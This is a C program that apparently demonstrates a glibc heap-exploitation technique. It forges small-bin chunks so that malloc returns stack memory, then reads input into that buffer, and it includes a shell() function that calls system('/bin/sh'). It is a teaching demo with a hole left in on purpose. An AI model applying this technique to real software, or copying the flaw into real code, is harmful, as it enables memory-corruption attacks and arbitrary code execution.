#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void shell() {
    system("/bin/sh");
}

int main() {
    unsigned long long fake1[4];
    unsigned long long fake2[4];
    void *fake_freelist[7][4];
    void *tcache_fillers[7];
    int i;

    unsigned long long* target = malloc(0x100);
    unsigned long long* target_chunk = target - 2; // points to target's beginning

    for(i = 0; i < 7; i++) {
        tcache_fillers[i] = malloc(0x100);
    }

    // create a fake list of free chunks (set the bk field of fake_freelist[i] to 
    // fake_freelist[i+1])
    // with the exception of fake_freelist[6]->bk = NULL
    for(i = 0; i < 6; i++) {
        fake_freelist[i][3] = fake_freelist[i+1];
    }
    fake_freelist[6][3] = NULL;

    // fake1 -> prev_size = 0, fake1->size = 0x20, fake1->fd = target_chunk
    fake1[0] = 0;
    fake1[1] = 0x20;
    fake1[2] = (unsigned long long)target_chunk;

    // To bypass security checks, assign fake2->fd = fake1 and fake1->bk = fake2
    fake1[3] = (unsigned long long)fake2;
    fake2[2] = (unsigned long long)fake1;

    // set the bk field of fake2 to the fake list of free chunks
    // this is done to avoid the tcache-to-smallbin mechanism
    // (this justifies the length 7 fake list)
    fake2[3] = (unsigned long long)fake_freelist[0];

    // Allocating a big enough chunk to avoid consolidating the top chunk
    malloc(1000);

    // Now, before free()'ing our target chunk, it is important to fill up the tcache
    // so we'll free our tcache fillers 
    for(i = 0; i < 7; i++) {
        free(tcache_fillers[i]);
    }

    // When free()'ing the victim chunk, it'll be placed in the unsorted bin
    free(target);
    // Now, target's fd and bk are equal to the address of the unsorted bin

    // We invoke malloc with a value that is big enough to 
    // force the unsorted bin to be sorted
    malloc(1200);
    // Now, our target resides in the small bin

    // This is the tricky part of this attack.
    // We need to have a way to overwrite target_chunk->bk with the address of fake1
    target_chunk[3] = (unsigned long long)fake1;
    // At this point, the small bin should be as follows (-> goes in the bk direction):
    // target -> fake1 -> fake2 -> [fake_freelist (1->...->6)]

    // We now wish to empty the tcache, for we want allocations to come from the small bin
    for(i = 0; i < 7; i++) {
        malloc(0x100);
    }

    // Allocating an additional chunk that should return the address of target
    printf("%p\n", malloc(0x100));

    // The next mallocs will now return an address on the stack

    for(i = 0; i < 7; i++) {
        target = malloc(0x100);
    }
    printf("target: %p\n", target);
    printf("fake1: %p\n", &fake1[2]);
    printf("after this long and unrelated sequence of malloc()'s and free()'s,");
    printf("I can trust you to write into this buffer, which resides in the heap\n");
    read(0, target, 0x100);
    return 0;
}